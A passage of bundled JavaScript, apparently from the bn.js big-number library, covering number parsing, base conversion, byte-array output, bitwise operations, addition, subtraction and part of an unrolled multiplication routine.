          var mod = total % limbLen;
          var end = Math.min(total, total - mod) + start;
          var word = 0;
          for (var i = start; i < end; i += limbLen) {
            word = parseBase(number, i, i + limbLen, base);
            this.imuln(limbPow);
            if (this.words[0] + word < 0x4000000) {
              this.words[0] += word;
            } else {
              this._iaddn(word);
            }
          }
          if (mod !== 0) {
            var pow = 1;
            word = parseBase(number, i, number.length, base);
            for (i = 0; i < mod; i++) {
              pow *= base;
            }
            this.imuln(pow);
            if (this.words[0] + word < 0x4000000) {
              this.words[0] += word;
            } else {
              this._iaddn(word);
            }
          }
          this._strip();
        };
        BN.prototype.copy = function copy(dest) {
          dest.words = new Array(this.length);
          for (var i = 0; i < this.length; i++) {
            dest.words[i] = this.words[i];
          }
          dest.length = this.length;
          dest.negative = this.negative;
          dest.red = this.red;
        };
        function move(dest, src) {
          dest.words = src.words;
          dest.length = src.length;
          dest.negative = src.negative;
          dest.red = src.red;
        }
        BN.prototype._move = function _move(dest) {
          move(dest, this);
        };
        BN.prototype.clone = function clone() {
          var r = new BN(null);
          this.copy(r);
          return r;
        };
        BN.prototype._expand = function _expand(size) {
          while (this.length < size) {
            this.words[this.length++] = 0;
          }
          return this;
        };
        BN.prototype._strip = function strip() {
          while (this.length > 1 && this.words[this.length - 1] === 0) {
            this.length--;
          }
          return this._normSign();
        };
        BN.prototype._normSign = function _normSign() {
          if (this.length === 1 && this.words[0] === 0) {
            this.negative = 0;
          }
          return this;
        };
        if (typeof Symbol !== 'undefined' && typeof Symbol.for === 'function') {
          try {
            BN.prototype[Symbol.for('nodejs.util.inspect.custom')] = inspect;
          } catch (e) {
            BN.prototype.inspect = inspect;
          }
        } else {
          BN.prototype.inspect = inspect;
        }
        function inspect() {
          return (this.red ? '<BN-R: ' : '<BN: ') + this.toString(16) + '>';
        }
        var zeros = ['', '0', '00', '000', '0000', '00000', '000000', '0000000', '00000000', '000000000', '0000000000', '00000000000', '000000000000', '0000000000000', '00000000000000', '000000000000000', '0000000000000000', '00000000000000000', '000000000000000000', '0000000000000000000', '00000000000000000000', '000000000000000000000', '0000000000000000000000', '00000000000000000000000', '000000000000000000000000', '0000000000000000000000000'];
        var groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5];
        var groupBases = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 10000000, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64000000, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 24300000, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
        BN.prototype.toString = function toString(base, padding) {
          base = base || 10;
          padding = padding | 0 || 1;
          var out;
          if (base === 16 || base === 'hex') {
            out = '';
            var off = 0;
            var carry = 0;
            for (var i = 0; i < this.length; i++) {
              var w = this.words[i];
              var word = ((w << off | carry) & 0xffffff).toString(16);
              carry = w >>> 24 - off & 0xffffff;
              off += 2;
              if (off >= 26) {
                off -= 26;
                i--;
              }
              if (carry !== 0 || i !== this.length - 1) {
                out = zeros[6 - word.length] + word + out;
              } else {
                out = word + out;
              }
            }
            if (carry !== 0) {
              out = carry.toString(16) + out;
            }
            while (out.length % padding !== 0) {
              out = '0' + out;
            }
            if (this.negative !== 0) {
              out = '-' + out;
            }
            return out;
          }
          if (base === (base | 0) && base >= 2 && base <= 36) {
            var groupSize = groupSizes[base];
            var groupBase = groupBases[base];
            out = '';
            var c = this.clone();
            c.negative = 0;
            while (!c.isZero()) {
              var r = c.modrn(groupBase).toString(base);
              c = c.idivn(groupBase);
              if (!c.isZero()) {
                out = zeros[groupSize - r.length] + r + out;
              } else {
                out = r + out;
              }
            }
            if (this.isZero()) {
              out = '0' + out;
            }
            while (out.length % padding !== 0) {
              out = '0' + out;
            }
            if (this.negative !== 0) {
              out = '-' + out;
            }
            return out;
          }
          assert(false, 'Base should be between 2 and 36');
        };
        BN.prototype.toNumber = function toNumber() {
          var ret = this.words[0];
          if (this.length === 2) {
            ret += this.words[1] * 0x4000000;
          } else if (this.length === 3 && this.words[2] === 0x01) {
            ret += 0x10000000000000 + this.words[1] * 0x4000000;
          } else if (this.length > 2) {
            assert(false, 'Number can only safely store up to 53 bits');
          }
          return this.negative !== 0 ? -ret : ret;
        };
        BN.prototype.toJSON = function toJSON() {
          return this.toString(16, 2);
        };
        if (Buffer) {
          BN.prototype.toBuffer = function toBuffer(endian, length) {
            return this.toArrayLike(Buffer, endian, length);
          };
        }
        BN.prototype.toArray = function toArray(endian, length) {
          return this.toArrayLike(Array, endian, length);
        };
        var allocate = function allocate(ArrayType, size) {
          if (ArrayType.allocUnsafe) {
            return ArrayType.allocUnsafe(size);
          }
          return new ArrayType(size);
        };
        BN.prototype.toArrayLike = function toArrayLike(ArrayType, endian, length) {
          this._strip();
          var byteLength = this.byteLength();
          var reqLength = length || Math.max(1, byteLength);
          assert(byteLength <= reqLength, 'byte array longer than desired length');
          assert(reqLength > 0, 'Requested array length <= 0');
          var res = allocate(ArrayType, reqLength);
          var postfix = endian === 'le' ? 'LE' : 'BE';
          this['_toArrayLike' + postfix](res, byteLength);
          return res;
        };
        BN.prototype._toArrayLikeLE = function _toArrayLikeLE(res, byteLength) {
          var position = 0;
          var carry = 0;
          for (var i = 0, shift = 0; i < this.length; i++) {
            var word = this.words[i] << shift | carry;
            res[position++] = word & 0xff;
            if (position < res.length) {
              res[position++] = word >> 8 & 0xff;
            }
            if (position < res.length) {
              res[position++] = word >> 16 & 0xff;
            }
            if (shift === 6) {
              if (position < res.length) {
                res[position++] = word >> 24 & 0xff;
              }
              carry = 0;
              shift = 0;
            } else {
              carry = word >>> 24;
              shift += 2;
            }
          }
          if (position < res.length) {
            res[position++] = carry;
            while (position < res.length) {
              res[position++] = 0;
            }
          }
        };
        BN.prototype._toArrayLikeBE = function _toArrayLikeBE(res, byteLength) {
          var position = res.length - 1;
          var carry = 0;
          for (var i = 0, shift = 0; i < this.length; i++) {
            var word = this.words[i] << shift | carry;
            res[position--] = word & 0xff;
            if (position >= 0) {
              res[position--] = word >> 8 & 0xff;
            }
            if (position >= 0) {
              res[position--] = word >> 16 & 0xff;
            }
            if (shift === 6) {
              if (position >= 0) {
                res[position--] = word >> 24 & 0xff;
              }
              carry = 0;
              shift = 0;
            } else {
              carry = word >>> 24;
              shift += 2;
            }
          }
          if (position >= 0) {
            res[position--] = carry;
            while (position >= 0) {
              res[position--] = 0;
            }
          }
        };
        if (Math.clz32) {
          BN.prototype._countBits = function _countBits(w) {
            return 32 - Math.clz32(w);
          };
        } else {
          BN.prototype._countBits = function _countBits(w) {
            var t = w;
            var r = 0;
            if (t >= 0x1000) {
              r += 13;
              t >>>= 13;
            }
            if (t >= 0x40) {
              r += 7;
              t >>>= 7;
            }
            if (t >= 0x8) {
              r += 4;
              t >>>= 4;
            }
            if (t >= 0x02) {
              r += 2;
              t >>>= 2;
            }
            return r + t;
          };
        }
        BN.prototype._zeroBits = function _zeroBits(w) {
          if (w === 0) return 26;
          var t = w;
          var r = 0;
          if ((t & 0x1fff) === 0) {
            r += 13;
            t >>>= 13;
          }
          if ((t & 0x7f) === 0) {
            r += 7;
            t >>>= 7;
          }
          if ((t & 0xf) === 0) {
            r += 4;
            t >>>= 4;
          }
          if ((t & 0x3) === 0) {
            r += 2;
            t >>>= 2;
          }
          if ((t & 0x1) === 0) {
            r++;
          }
          return r;
        };
        BN.prototype.bitLength = function bitLength() {
          var w = this.words[this.length - 1];
          var hi = this._countBits(w);
          return (this.length - 1) * 26 + hi;
        };
        function toBitArray(num) {
          var w = new Array(num.bitLength());
          for (var bit = 0; bit < w.length; bit++) {
            var off = bit / 26 | 0;
            var wbit = bit % 26;
            w[bit] = num.words[off] >>> wbit & 0x01;
          }
          return w;
        }
        BN.prototype.zeroBits = function zeroBits() {
          if (this.isZero()) return 0;
          var r = 0;
          for (var i = 0; i < this.length; i++) {
            var b = this._zeroBits(this.words[i]);
            r += b;
            if (b !== 26) break;
          }
          return r;
        };
        BN.prototype.byteLength = function byteLength() {
          return Math.ceil(this.bitLength() / 8);
        };
        BN.prototype.toTwos = function toTwos(width) {
          if (this.negative !== 0) {
            return this.abs().inotn(width).iaddn(1);
          }
          return this.clone();
        };
        BN.prototype.fromTwos = function fromTwos(width) {
          if (this.testn(width - 1)) {
            return this.notn(width).iaddn(1).ineg();
          }
          return this.clone();
        };
        BN.prototype.isNeg = function isNeg() {
          return this.negative !== 0;
        };
        BN.prototype.neg = function neg() {
          return this.clone().ineg();
        };
        BN.prototype.ineg = function ineg() {
          if (!this.isZero()) {
            this.negative ^= 1;
          }
          return this;
        };
        BN.prototype.iuor = function iuor(num) {
          while (this.length < num.length) {
            this.words[this.length++] = 0;
          }
          for (var i = 0; i < num.length; i++) {
            this.words[i] = this.words[i] | num.words[i];
          }
          return this._strip();
        };
        BN.prototype.ior = function ior(num) {
          assert((this.negative | num.negative) === 0);
          return this.iuor(num);
        };
        BN.prototype.or = function or(num) {
          if (this.length > num.length) return this.clone().ior(num);
          return num.clone().ior(this);
        };
        BN.prototype.uor = function uor(num) {
          if (this.length > num.length) return this.clone().iuor(num);
          return num.clone().iuor(this);
        };
        BN.prototype.iuand = function iuand(num) {
          var b;
          if (this.length > num.length) {
            b = num;
          } else {
            b = this;
          }
          for (var i = 0; i < b.length; i++) {
            this.words[i] = this.words[i] & num.words[i];
          }
          this.length = b.length;
          return this._strip();
        };
        BN.prototype.iand = function iand(num) {
          assert((this.negative | num.negative) === 0);
          return this.iuand(num);
        };
        BN.prototype.and = function and(num) {
          if (this.length > num.length) return this.clone().iand(num);
          return num.clone().iand(this);
        };
        BN.prototype.uand = function uand(num) {
          if (this.length > num.length) return this.clone().iuand(num);
          return num.clone().iuand(this);
        };
        BN.prototype.iuxor = function iuxor(num) {
          var a;
          var b;
          if (this.length > num.length) {
            a = this;
            b = num;
          } else {
            a = num;
            b = this;
          }
          for (var i = 0; i < b.length; i++) {
            this.words[i] = a.words[i] ^ b.words[i];
          }
          if (this !== a) {
            for (; i < a.length; i++) {
              this.words[i] = a.words[i];
            }
          }
          this.length = a.length;
          return this._strip();
        };
        BN.prototype.ixor = function ixor(num) {
          assert((this.negative | num.negative) === 0);
          return this.iuxor(num);
        };
        BN.prototype.xor = function xor(num) {
          if (this.length > num.length) return this.clone().ixor(num);
          return num.clone().ixor(this);
        };
        BN.prototype.uxor = function uxor(num) {
          if (this.length > num.length) return this.clone().iuxor(num);
          return num.clone().iuxor(this);
        };
        BN.prototype.inotn = function inotn(width) {
          assert(typeof width === 'number' && width >= 0);
          var bytesNeeded = Math.ceil(width / 26) | 0;
          var bitsLeft = width % 26;
          this._expand(bytesNeeded);
          if (bitsLeft > 0) {
            bytesNeeded--;
          }
          for (var i = 0; i < bytesNeeded; i++) {
            this.words[i] = ~this.words[i] & 0x3ffffff;
          }
          if (bitsLeft > 0) {
            this.words[i] = ~this.words[i] & 0x3ffffff >> 26 - bitsLeft;
          }
          return this._strip();
        };
        BN.prototype.notn = function notn(width) {
          return this.clone().inotn(width);
        };
        BN.prototype.setn = function setn(bit, val) {
          assert(typeof bit === 'number' && bit >= 0);
          var off = bit / 26 | 0;
          var wbit = bit % 26;
          this._expand(off + 1);
          if (val) {
            this.words[off] = this.words[off] | 1 << wbit;
          } else {
            this.words[off] = this.words[off] & ~(1 << wbit);
          }
          return this._strip();
        };
        BN.prototype.iadd = function iadd(num) {
          var r;
          if (this.negative !== 0 && num.negative === 0) {
            this.negative = 0;
            r = this.isub(num);
            this.negative ^= 1;
            return this._normSign();
          } else if (this.negative === 0 && num.negative !== 0) {
            num.negative = 0;
            r = this.isub(num);
            num.negative = 1;
            return r._normSign();
          }
          var a, b;
          if (this.length > num.length) {
            a = this;
            b = num;
          } else {
            a = num;
            b = this;
          }
          var carry = 0;
          for (var i = 0; i < b.length; i++) {
            r = (a.words[i] | 0) + (b.words[i] | 0) + carry;
            this.words[i] = r & 0x3ffffff;
            carry = r >>> 26;
          }
          for (; carry !== 0 && i < a.length; i++) {
            r = (a.words[i] | 0) + carry;
            this.words[i] = r & 0x3ffffff;
            carry = r >>> 26;
          }
          this.length = a.length;
          if (carry !== 0) {
            this.words[this.length] = carry;
            this.length++;
          } else if (a !== this) {
            for (; i < a.length; i++) {
              this.words[i] = a.words[i];
            }
          }
          return this;
        };
        BN.prototype.add = function add(num) {
          var res;
          if (num.negative !== 0 && this.negative === 0) {
            num.negative = 0;
            res = this.sub(num);
            num.negative ^= 1;
            return res;
          } else if (num.negative === 0 && this.negative !== 0) {
            this.negative = 0;
            res = num.sub(this);
            this.negative = 1;
            return res;
          }
          if (this.length > num.length) return this.clone().iadd(num);
          return num.clone().iadd(this);
        };
        BN.prototype.isub = function isub(num) {
          if (num.negative !== 0) {
            num.negative = 0;
            var r = this.iadd(num);
            num.negative = 1;
            return r._normSign();
          } else if (this.negative !== 0) {
            this.negative = 0;
            this.iadd(num);
            this.negative = 1;
            return this._normSign();
          }
          var cmp = this.cmp(num);
          if (cmp === 0) {
            this.negative = 0;
            this.length = 1;
            this.words[0] = 0;
            return this;
          }
          var a, b;
          if (cmp > 0) {
            a = this;
            b = num;
          } else {
            a = num;
            b = this;
          }
          var carry = 0;
          for (var i = 0; i < b.length; i++) {
            r = (a.words[i] | 0) - (b.words[i] | 0) + carry;
            carry = r >> 26;
            this.words[i] = r & 0x3ffffff;
          }
          for (; carry !== 0 && i < a.length; i++) {
            r = (a.words[i] | 0) + carry;
            carry = r >> 26;
            this.words[i] = r & 0x3ffffff;
          }
          if (carry === 0 && i < a.length && a !== this) {
            for (; i < a.length; i++) {
              this.words[i] = a.words[i];
            }
          }
          this.length = Math.max(this.length, i);
          if (a !== this) {
            this.negative = 1;
          }
          return this._strip();
        };
        BN.prototype.sub = function sub(num) {
          return this.clone().isub(num);
        };
        function smallMulTo(self, num, out) {
          out.negative = num.negative ^ self.negative;
          var len = self.length + num.length | 0;
          out.length = len;
          len = len - 1 | 0;
          var a = self.words[0] | 0;
          var b = num.words[0] | 0;
          var r = a * b;
          var lo = r & 0x3ffffff;
          var carry = r / 0x4000000 | 0;
          out.words[0] = lo;
          for (var k = 1; k < len; k++) {
            var ncarry = carry >>> 26;
            var rword = carry & 0x3ffffff;
            var maxJ = Math.min(k, num.length - 1);
            for (var j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
              var i = k - j | 0;
              a = self.words[i] | 0;
              b = num.words[j] | 0;
              r = a * b + rword;
              ncarry += r / 0x4000000 | 0;
              rword = r & 0x3ffffff;
            }
            out.words[k] = rword | 0;
            carry = ncarry | 0;
          }
          if (carry !== 0) {
            out.words[k] = carry | 0;
          } else {
            out.length--;
          }
          return out._strip();
        }
        var comb10MulTo = function comb10MulTo(self, num, out) {
          var a = self.words;
          var b = num.words;
          var o = out.words;
          var c = 0;
          var lo;
          var mid;
          var hi;
          var a0 = a[0] | 0;
          var al0 = a0 & 0x1fff;
          var ah0 = a0 >>> 13;
          var a1 = a[1] | 0;
          var al1 = a1 & 0x1fff;
          var ah1 = a1 >>> 13;
          var a2 = a[2] | 0;
          var al2 = a2 & 0x1fff;
          var ah2 = a2 >>> 13;
          var a3 = a[3] | 0;
          var al3 = a3 & 0x1fff;
          var ah3 = a3 >>> 13;
          var a4 = a[4] | 0;
          var al4 = a4 & 0x1fff;
          var ah4 = a4 >>> 13;
          var a5 = a[5] | 0;
          var al5 = a5 & 0x1fff;
          var ah5 = a5 >>> 13;
          var a6 = a[6] | 0;
          var al6 = a6 & 0x1fff;
          var ah6 = a6 >>> 13;
          var a7 = a[7] | 0;
          var al7 = a7 & 0x1fff;
          var ah7 = a7 >>> 13;
          var a8 = a[8] | 0;
          var al8 = a8 & 0x1fff;
          var ah8 = a8 >>> 13;
          var a9 = a[9] | 0;
          var al9 = a9 & 0x1fff;
          var ah9 = a9 >>> 13;
          var b0 = b[0] | 0;
          var bl0 = b0 & 0x1fff;
          var bh0 = b0 >>> 13;
          var b1 = b[1] | 0;
          var bl1 = b1 & 0x1fff;
          var bh1 = b1 >>> 13;
          var b2 = b[2] | 0;
          var bl2 = b2 & 0x1fff;
          var bh2 = b2 >>> 13;
          var b3 = b[3] | 0;
          var bl3 = b3 & 0x1fff;
          var bh3 = b3 >>> 13;
          var b4 = b[4] | 0;
          var bl4 = b4 & 0x1fff;
          var bh4 = b4 >>> 13;
          var b5 = b[5] | 0;
          var bl5 = b5 & 0x1fff;
          var bh5 = b5 >>> 13;
          var b6 = b[6] | 0;
          var bl6 = b6 & 0x1fff;
          var bh6 = b6 >>> 13;
          var b7 = b[7] | 0;
          var bl7 = b7 & 0x1fff;
          var bh7 = b7 >>> 13;
          var b8 = b[8] | 0;
          var bl8 = b8 & 0x1fff;
          var bh8 = b8 >>> 13;
          var b9 = b[9] | 0;
          var bl9 = b9 & 0x1fff;
          var bh9 = b9 >>> 13;
          out.negative = self.negative ^ num.negative;
          out.length = 19;
          lo = Math.imul(al0, bl0);
          mid = Math.imul(al0, bh0);
          mid = mid + Math.imul(ah0, bl0) | 0;
          hi = Math.imul(ah0, bh0);
          var w0 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w0 >>> 26) | 0;
          w0 &= 0x3ffffff;
          lo = Math.imul(al1, bl0);
          mid = Math.imul(al1, bh0);
          mid = mid + Math.imul(ah1, bl0) | 0;
          hi = Math.imul(ah1, bh0);
          lo = lo + Math.imul(al0, bl1) | 0;
          mid = mid + Math.imul(al0, bh1) | 0;
          mid = mid + Math.imul(ah0, bl1) | 0;
          hi = hi + Math.imul(ah0, bh1) | 0;
          var w1 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w1 >>> 26) | 0;
          w1 &= 0x3ffffff;
          lo = Math.imul(al2, bl0);
          mid = Math.imul(al2, bh0);
          mid = mid + Math.imul(ah2, bl0) | 0;
          hi = Math.imul(ah2, bh0);
          lo = lo + Math.imul(al1, bl1) | 0;
          mid = mid + Math.imul(al1, bh1) | 0;
          mid = mid + Math.imul(ah1, bl1) | 0;
          hi = hi + Math.imul(ah1, bh1) | 0;
          lo = lo + Math.imul(al0, bl2) | 0;
          mid = mid + Math.imul(al0, bh2) | 0;
          mid = mid + Math.imul(ah0, bl2) | 0;
          hi = hi + Math.imul(ah0, bh2) | 0;
          var w2 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w2 >>> 26) | 0;
          w2 &= 0x3ffffff;
          lo = Math.imul(al3, bl0);
          mid = Math.imul(al3, bh0);
          mid = mid + Math.imul(ah3, bl0) | 0;
          hi = Math.imul(ah3, bh0);
          lo = lo + Math.imul(al2, bl1) | 0;
          mid = mid + Math.imul(al2, bh1) | 0;
          mid = mid + Math.imul(ah2, bl1) | 0;
          hi = hi + Math.imul(ah2, bh1) | 0;
          lo = lo + Math.imul(al1, bl2) | 0;
          mid = mid + Math.imul(al1, bh2) | 0;
          mid = mid + Math.imul(ah1, bl2) | 0;
          hi = hi + Math.imul(ah1, bh2) | 0;
          lo = lo + Math.imul(al0, bl3) | 0;
          mid = mid + Math.imul(al0, bh3) | 0;
          mid = mid + Math.imul(ah0, bl3) | 0;
          hi = hi + Math.imul(ah0, bh3) | 0;
          var w3 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w3 >>> 26) | 0;
          w3 &= 0x3ffffff;
          lo = Math.imul(al4, bl0);
          mid = Math.imul(al4, bh0);
          mid = mid + Math.imul(ah4, bl0) | 0;
          hi = Math.imul(ah4, bh0);
          lo = lo + Math.imul(al3, bl1) | 0;
          mid = mid + Math.imul(al3, bh1) | 0;
          mid = mid + Math.imul(ah3, bl1) | 0;
          hi = hi + Math.imul(ah3, bh1) | 0;
          lo = lo + Math.imul(al2, bl2) | 0;
          mid = mid + Math.imul(al2, bh2) | 0;
          mid = mid + Math.imul(ah2, bl2) | 0;
          hi = hi + Math.imul(ah2, bh2) | 0;
          lo = lo + Math.imul(al1, bl3) | 0;
          mid = mid + Math.imul(al1, bh3) | 0;
          mid = mid + Math.imul(ah1, bl3) | 0;
          hi = hi + Math.imul(ah1, bh3) | 0;
          lo = lo + Math.imul(al0, bl4) | 0;
          mid = mid + Math.imul(al0, bh4) | 0;
          mid = mid + Math.imul(ah0, bl4) | 0;
          hi = hi + Math.imul(ah0, bh4) | 0;
          var w4 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w4 >>> 26) | 0;
          w4 &= 0x3ffffff;
          lo = Math.imul(al5, bl0);
          mid = Math.imul(al5, bh0);
          mid = mid + Math.imul(ah5, bl0) | 0;
          hi = Math.imul(ah5, bh0);
          lo = lo + Math.imul(al4, bl1) | 0;
          mid = mid + Math.imul(al4, bh1) | 0;
          mid = mid + Math.imul(ah4, bl1) | 0;
          hi = hi + Math.imul(ah4, bh1) | 0;
          lo = lo + Math.imul(al3, bl2) | 0;
          mid = mid + Math.imul(al3, bh2) | 0;
          mid = mid + Math.imul(ah3, bl2) | 0;
          hi = hi + Math.imul(ah3, bh2) | 0;
          lo = lo + Math.imul(al2, bl3) | 0;
          mid = mid + Math.imul(al2, bh3) | 0;
          mid = mid + Math.imul(ah2, bl3) | 0;
          hi = hi + Math.imul(ah2, bh3) | 0;
          lo = lo + Math.imul(al1, bl4) | 0;
          mid = mid + Math.imul(al1, bh4) | 0;
          mid = mid + Math.imul(ah1, bl4) | 0;
          hi = hi + Math.imul(ah1, bh4) | 0;
          lo = lo + Math.imul(al0, bl5) | 0;
          mid = mid + Math.imul(al0, bh5) | 0;
          mid = mid + Math.imul(ah0, bl5) | 0;
          hi = hi + Math.imul(ah0, bh5) | 0;
          var w5 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w5 >>> 26) | 0;
          w5 &= 0x3ffffff;
          lo = Math.imul(al6, bl0);
          mid = Math.imul(al6, bh0);
          mid = mid + Math.imul(ah6, bl0) | 0;
          hi = Math.imul(ah6, bh0);
          lo = lo + Math.imul(al5, bl1) | 0;
          mid = mid + Math.imul(al5, bh1) | 0;
          mid = mid + Math.imul(ah5, bl1) | 0;
          hi = hi + Math.imul(ah5, bh1) | 0;
          lo = lo + Math.imul(al4, bl2) | 0;
          mid = mid + Math.imul(al4, bh2) | 0;
          mid = mid + Math.imul(ah4, bl2) | 0;
          hi = hi + Math.imul(ah4, bh2) | 0;
          lo = lo + Math.imul(al3, bl3) | 0;
          mid = mid + Math.imul(al3, bh3) | 0;
          mid = mid + Math.imul(ah3, bl3) | 0;
          hi = hi + Math.imul(ah3, bh3) | 0;
          lo = lo + Math.imul(al2, bl4) | 0;
          mid = mid + Math.imul(al2, bh4) | 0;
          mid = mid + Math.imul(ah2, bl4) | 0;
          hi = hi + Math.imul(ah2, bh4) | 0;
          lo = lo + Math.imul(al1, bl5) | 0;
          mid = mid + Math.imul(al1, bh5) | 0;
          mid = mid + Math.imul(ah1, bl5) | 0;
          hi = hi + Math.imul(ah1, bh5) | 0;
          lo = lo + Math.imul(al0, bl6) | 0;
          mid = mid + Math.imul(al0, bh6) | 0;
          mid = mid + Math.imul(ah0, bl6) | 0;
          hi = hi + Math.imul(ah0, bh6) | 0;
          var w6 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w6 >>> 26) | 0;
          w6 &= 0x3ffffff;
          lo = Math.imul(al7, bl0);
          mid = Math.imul(al7, bh0);
          mid = mid + Math.imul(ah7, bl0) | 0;
          hi = Math.imul(ah7, bh0);
          lo = lo + Math.imul(al6, bl1) | 0;
          mid = mid + Math.imul(al6, bh1) | 0;
          mid = mid + Math.imul(ah6, bl1) | 0;
          hi = hi + Math.imul(ah6, bh1) | 0;
          lo = lo + Math.imul(al5, bl2) | 0;
          mid = mid + Math.imul(al5, bh2) | 0;
          mid = mid + Math.imul(ah5, bl2) | 0;
          hi = hi + Math.imul(ah5, bh2) | 0;
          lo = lo + Math.imul(al4, bl3) | 0;
          mid = mid + Math.imul(al4, bh3) | 0;
          mid = mid + Math.imul(ah4, bl3) | 0;
          hi = hi + Math.imul(ah4, bh3) | 0;
          lo = lo + Math.imul(al3, bl4) | 0;
          mid = mid + Math.imul(al3, bh4) | 0;
          mid = mid + Math.imul(ah3, bl4) | 0;
          hi = hi + Math.imul(ah3, bh4) | 0;
          lo = lo + Math.imul(al2, bl5) | 0;
          mid = mid + Math.imul(al2, bh5) | 0;
          mid = mid + Math.imul(ah2, bl5) | 0;
          hi = hi + Math.imul(ah2, bh5) | 0;
          lo = lo + Math.imul(al1, bl6) | 0;
          mid = mid + Math.imul(al1, bh6) | 0;
          mid = mid + Math.imul(ah1, bl6) | 0;
          hi = hi + Math.imul(ah1, bh6) | 0;
          lo = lo + Math.imul(al0, bl7) | 0;
          mid = mid + Math.imul(al0, bh7) | 0;
          mid = mid + Math.imul(ah0, bl7) | 0;
          hi = hi + Math.imul(ah0, bh7) | 0;
          var w7 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w7 >>> 26) | 0;
          w7 &= 0x3ffffff;
          lo = Math.imul(al8, bl0);
          mid = Math.imul(al8, bh0);
          mid = mid + Math.imul(ah8, bl0) | 0;
          hi = Math.imul(ah8, bh0);
          lo = lo + Math.imul(al7, bl1) | 0;
          mid = mid + Math.imul(al7, bh1) | 0;
          mid = mid + Math.imul(ah7, bl1) | 0;
          hi = hi + Math.imul(ah7, bh1) | 0;
          lo = lo + Math.imul(al6, bl2) | 0;
          mid = mid + Math.imul(al6, bh2) | 0;
          mid = mid + Math.imul(ah6, bl2) | 0;
          hi = hi + Math.imul(ah6, bh2) | 0;
          lo = lo + Math.imul(al5, bl3) | 0;
          mid = mid + Math.imul(al5, bh3) | 0;
          mid = mid + Math.imul(ah5, bl3) | 0;
          hi = hi + Math.imul(ah5, bh3) | 0;
          lo = lo + Math.imul(al4, bl4) | 0;
          mid = mid + Math.imul(al4, bh4) | 0;
          mid = mid + Math.imul(ah4, bl4) | 0;
          hi = hi + Math.imul(ah4, bh4) | 0;
          lo = lo + Math.imul(al3, bl5) | 0;
          mid = mid + Math.imul(al3, bh5) | 0;
          mid = mid + Math.imul(ah3, bl5) | 0;
          hi = hi + Math.imul(ah3, bh5) | 0;
          lo = lo + Math.imul(al2, bl6) | 0;
          mid = mid + Math.imul(al2, bh6) | 0;
          mid = mid + Math.imul(ah2, bl6) | 0;
          hi = hi + Math.imul(ah2, bh6) | 0;
          lo = lo + Math.imul(al1, bl7) | 0;
          mid = mid + Math.imul(al1, bh7) | 0;
          mid = mid + Math.imul(ah1, bl7) | 0;
          hi = hi + Math.imul(ah1, bh7) | 0;
          lo = lo + Math.imul(al0, bl8) | 0;
          mid = mid + Math.imul(al0, bh8) | 0;
          mid = mid + Math.imul(ah0, bl8) | 0;
          hi = hi + Math.imul(ah0, bh8) | 0;
          var w8 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w8 >>> 26) | 0;
          w8 &= 0x3ffffff;
          lo = Math.imul(al9, bl0);
          mid = Math.imul(al9, bh0);
          mid = mid + Math.imul(ah9, bl0) | 0;
          hi = Math.imul(ah9, bh0);
          lo = lo + Math.imul(al8, bl1) | 0;
          mid = mid + Math.imul(al8, bh1) | 0;
          mid = mid + Math.imul(ah8, bl1) | 0;
          hi = hi + Math.imul(ah8, bh1) | 0;
          lo = lo + Math.imul(al7, bl2) | 0;
          mid = mid + Math.imul(al7, bh2) | 0;
          mid = mid + Math.imul(ah7, bl2) | 0;
          hi = hi + Math.imul(ah7, bh2) | 0;
          lo = lo + Math.imul(al6, bl3) | 0;
          mid = mid + Math.imul(al6, bh3) | 0;
          mid = mid + Math.imul(ah6, bl3) | 0;
          hi = hi + Math.imul(ah6, bh3) | 0;
          lo = lo + Math.imul(al5, bl4) | 0;
          mid = mid + Math.imul(al5, bh4) | 0;
          mid = mid + Math.imul(ah5, bl4) | 0;
          hi = hi + Math.imul(ah5, bh4) | 0;
          lo = lo + Math.imul(al4, bl5) | 0;
          mid = mid + Math.imul(al4, bh5) | 0;
          mid = mid + Math.imul(ah4, bl5) | 0;
          hi = hi + Math.imul(ah4, bh5) | 0;
          lo = lo + Math.imul(al3, bl6) | 0;
          mid = mid + Math.imul(al3, bh6) | 0;
          mid = mid + Math.imul(ah3, bl6) | 0;
          hi = hi + Math.imul(ah3, bh6) | 0;
          lo = lo + Math.imul(al2, bl7) | 0;
          mid = mid + Math.imul(al2, bh7) | 0;
          mid = mid + Math.imul(ah2, bl7) | 0;
          hi = hi + Math.imul(ah2, bh7) | 0;
          lo = lo + Math.imul(al1, bl8) | 0;
          mid = mid + Math.imul(al1, bh8) | 0;
          mid = mid + Math.imul(ah1, bl8) | 0;
          hi = hi + Math.imul(ah1, bh8) | 0;
          lo = lo + Math.imul(al0, bl9) | 0;
          mid = mid + Math.imul(al0, bh9) | 0;
          mid = mid + Math.imul(ah0, bl9) | 0;
          hi = hi + Math.imul(ah0, bh9) | 0;
          var w9 = (c + lo | 0) + ((mid & 0x1fff) << 13) | 0;
          c = (hi + (mid >>> 13) | 0) + (w9 >>> 26) | 0;
          w9 &= 0x3ffffff;
          lo = Math.imul(al9, bl1);
          mid = Math.imul(al9, bh1);
          mid = mid + Math.imul(ah9, bl1) | 0;
          hi = Math.imul(ah9, bh1);
